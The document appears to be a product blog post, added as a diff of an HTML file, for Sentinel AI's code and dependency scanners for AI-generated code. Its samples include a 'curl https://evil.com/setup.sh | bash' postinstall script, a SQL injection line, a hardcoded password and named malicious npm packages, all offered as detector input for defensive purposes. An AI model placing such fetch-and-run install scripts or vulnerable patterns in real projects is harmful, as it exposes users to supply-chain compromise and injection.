@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk | Sentinel AI</title>
+<meta name="description" content="Claude Code writes code fast. Sentinel AI's CodeScanner and DependencyScanner catch OWASP vulnerabilities and supply chain attacks before the code is saved.">
+<meta property="og:title" content="Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk">
+<meta property="og:description" content="OWASP Top 10 detection and supply chain attack prevention for AI-generated code.">
+<meta property="og:type" content="article">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #12121a;
+    --border: #1e1e2e;
+    --text: #e0e0e8;
+    --muted: #8888a0;
+    --accent: #6366f1;
+    --accent2: #818cf8;
+    --green: #22c55e;
+    --red: #ef4444;
+    --yellow: #eab308;
+    --code-bg: #1a1a2e;
+  }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.8;
+    padding: 2rem;
+    max-width: 800px;
+    margin: 0 auto;
+  }
+  a { color: var(--accent2); text-decoration: none; }
+  a:hover { text-decoration: underline; }
+  h1 { font-size: 2rem; margin: 2rem 0 0.5rem; line-height: 1.3; }
+  h2 { font-size: 1.4rem; margin: 2rem 0 1rem; color: var(--accent2); }
+  h3 { font-size: 1.1rem; margin: 1.5rem 0 0.5rem; }
+  p { margin: 0.8rem 0; }
+  .meta { color: var(--muted); font-size: 0.9rem; margin-bottom: 2rem; }
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 1rem;
+    overflow-x: auto;
+    font-size: 0.85rem;
+    line-height: 1.5;
+    margin: 1rem 0;
+  }
+  code { font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace; }
+  .inline-code {
+    background: var(--code-bg);
+    padding: 0.15rem 0.4rem;
+    border-radius: 4px;
+    font-size: 0.85em;
+  }
+  .vuln-table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1rem 0;
+    font-size: 0.9rem;
+  }
+  .vuln-table th, .vuln-table td {
+    text-align: left;
+    padding: 0.6rem 0.8rem;
+    border: 1px solid var(--border);
+  }
+  .vuln-table th {
+    background: var(--surface);
+    color: var(--accent2);
+    font-weight: 600;
+  }
+  .risk-critical { color: var(--red); font-weight: bold; }
+  .risk-high { color: #f97316; font-weight: bold; }
+  .risk-medium { color: var(--yellow); }
+  .back { display: inline-block; margin-bottom: 1rem; color: var(--muted); }
+  .callout {
+    background: var(--surface);
+    border-left: 3px solid var(--accent);
+    padding: 1rem 1.2rem;
+    margin: 1.5rem 0;
+    border-radius: 0 6px 6px 0;
+  }
+  .finding {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 0.8rem 1rem;
+    margin: 0.5rem 0;
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .finding .risk {
+    padding: 0.15rem 0.5rem;
+    border-radius: 4px;
+    font-size: 0.75rem;
+    font-weight: 700;
+    text-transform: uppercase;
+  }
+  .risk-bg-critical { background: rgba(239,68,68,0.15); color: var(--red); }
+  .risk-bg-high { background: rgba(249,115,22,0.15); color: #f97316; }
+  .risk-bg-medium { background: rgba(234,179,8,0.15); color: var(--yellow); }
+</style>
+</head>
+<body>
+<a href="../" class="back">&larr; Back to Sentinel AI</a>
+
+<h1>Scanning AI-Generated Code for Vulnerabilities Before It Hits Disk</h1>
+<div class="meta">March 8, 2026 &middot; 5 min read</div>
+
+<p>AI coding assistants like Claude Code can write hundreds of lines per minute. That speed is a feature &mdash; until the generated code contains a SQL injection vulnerability, a hardcoded API key, or a dependency on a known malicious npm package.</p>
+
+<p>The problem isn't that AI writes <em>more</em> vulnerable code than humans. It's that AI writes code <em>faster</em>, and the review bottleneck shifts. Traditional code review catches these issues eventually. But in an AI-assisted workflow where code goes from generation to execution in seconds, "eventually" might be too late.</p>
+
+<h2>The Two Scanners</h2>
+
+<p>Sentinel AI v0.13.0 introduces two scanners designed specifically for this workflow:</p>
+
+<h3>CodeScanner &mdash; OWASP Top 10 Detection</h3>
+
+<p>Detects security vulnerabilities in generated Python, JavaScript, and shell code:</p>
+
+<table class="vuln-table">
+<tr><th>Category</th><th>Risk</th><th>What It Catches</th></tr>
+<tr><td>SQL Injection</td><td class="risk-critical">CRITICAL</td><td>f-strings, concatenation, .format() in queries</td></tr>
+<tr><td>Command Injection</td><td class="risk-critical">CRITICAL</td><td>subprocess shell=True, os.system, eval with user input</td></tr>
+<tr><td>XSS</td><td class="risk-high">HIGH</td><td>innerHTML, document.write, template |safe filter</td></tr>
+<tr><td>Path Traversal</td><td class="risk-high">HIGH</td><td>open() with user-controlled paths</td></tr>
+<tr><td>Insecure Deserialization</td><td class="risk-high">HIGH</td><td>pickle.load, yaml.load without SafeLoader</td></tr>
+<tr><td>Hardcoded Secrets</td><td class="risk-critical">CRITICAL</td><td>API keys, AWS keys, passwords in source</td></tr>
+<tr><td>Weak Crypto</td><td class="risk-medium">MEDIUM</td><td>MD5/SHA1 for security, AES-ECB, DES</td></tr>
+<tr><td>SSRF</td><td class="risk-high">HIGH</td><td>User-controlled URLs in HTTP requests</td></tr>
+</table>
+
+<h3>DependencyScanner &mdash; Supply Chain Attack Detection</h3>
+
+<p>When Claude Code adds a package to your requirements.txt or package.json, this scanner checks for:</p>
+
+<ul style="margin: 0.5rem 0 0.5rem 1.5rem;">
+<li><strong>Typosquatting</strong> &mdash; <code class="inline-code">reqests</code> instead of <code class="inline-code">requests</code>, <code class="inline-code">loadash</code> instead of <code class="inline-code">lodash</code></li>
+<li><strong>Known malicious packages</strong> &mdash; crossenv, nodemailer-js, event-stream variants</li>
+<li><strong>Suspicious install scripts</strong> &mdash; <code class="inline-code">postinstall: "curl evil.com | bash"</code></li>
+<li><strong>Suspicious URLs</strong> &mdash; pastebin sources, raw IPs, shady TLDs</li>
+<li><strong>Unpinned versions</strong> &mdash; <code class="inline-code">"*"</code> or <code class="inline-code">"latest"</code></li>
+</ul>
+
+<h2>Usage: Direct Scanning</h2>
+
+<pre><code>import { CodeScanner, DependencyScanner } from '@sentinel-ai/sdk';
+
+// Scan generated code
+const codeScan = new CodeScanner();
+const findings = codeScan.scan(`
+  cursor.execute(f"SELECT * FROM users WHERE id={user_id}")
+  password = "SuperSecret123!@#"
+`);
+// findings[0]: {category: 'sql_injection', risk: 'CRITICAL'}
+// findings[1]: {category: 'hardcoded_secret', risk: 'CRITICAL'}
+
+// Scan a package.json
+const depScan = new DependencyScanner();
+const depFindings = depScan.scan(JSON.stringify({
+  dependencies: { "crossenv": "^1.0.0", "express": "*" },
+  scripts: { postinstall: "curl https://evil.com/setup.sh | bash" }
+}), 'package.json');
+// depFindings[0]: {category: 'malicious_package', risk: 'CRITICAL'}
+// depFindings[1]: {category: 'unpinned_dependency', risk: 'MEDIUM'}
+// depFindings[2]: {category: 'dangerous_install_script', risk: 'CRITICAL'}</code></pre>
+
+<h2>Usage: Claude Code PostToolUse Hook</h2>
+
+<p>The CodeScanner integrates with Claude Code's hook system to scan code <em>as it's being written</em>:</p>
+
+<pre><code># .claude/settings.json
+{
+  "hooks": {
+    "PostToolUse": [
+      {
+        "matcher": "Write|Edit",
+        "hooks": [{
+          "type": "command",
+          "command": "sentinel code-scan --stdin --format json"
+        }]
+      }
+    ]
+  }
+}</code></pre>
+
+<p>Every time Claude Code writes or edits a file, the hook runs the CodeScanner on the output and flags vulnerabilities before the user proceeds.</p>
+
+<h2>Usage: GitHub Action</h2>
+
+<pre><code># .github/workflows/security.yml
+- uses: MaxwellCalkin/sentinel-ai@v0.13.0
+  with:
+    code-scan: "src/"
+    secrets-scan: true
+    block-on: high</code></pre>
+
+<h2>Why Not Just Use a Linter?</h2>
+
+<p>Linters are great for style and static analysis. But they have limitations in the AI-assisted workflow:</p>
+
+<div class="callout">
+<strong>Speed matters.</strong> Sentinel AI scans complete in sub-millisecond time. A traditional lint pass on a full project takes seconds. When you're scanning every Write/Edit tool call in real-time, latency is the enemy.
+</div>
+
+<div class="callout">
+<strong>Context matters.</strong> Sentinel AI's <code class="inline-code">scanToolOutput()</code> method receives the exact tool name and arguments from Claude Code, so it knows the file path, the content being written, and whether it's a new file or an edit. This lets it make smarter decisions about what to flag.
+</div>
+
+<div class="callout">
+<strong>Supply chain attacks aren't syntax errors.</strong> No linter will tell you that <code class="inline-code">crossenv</code> is a known malicious package or that your postinstall script downloads and executes code from a paste site.
+</div>
+
+<h2>Zero Dependencies, Sub-Millisecond</h2>
+
+<p>Both scanners use pure regex pattern matching &mdash; no AST parsing, no network calls, no heavy dependencies. Average scan latency is ~0.05ms. The entire JS/TS SDK is a single file with zero npm dependencies.</p>
+
+<p>Available in Python (<code class="inline-code">pip install sentinel-guardrails</code>) and TypeScript (<code class="inline-code">@sentinel-ai/sdk</code>). Both have full feature parity.</p>
+
+<p><a href="https://github.com/MaxwellCalkin/sentinel-ai">View on GitHub</a> &middot; <a href="../">Try the Live Demo</a></p>
+
+</body>
+</html>
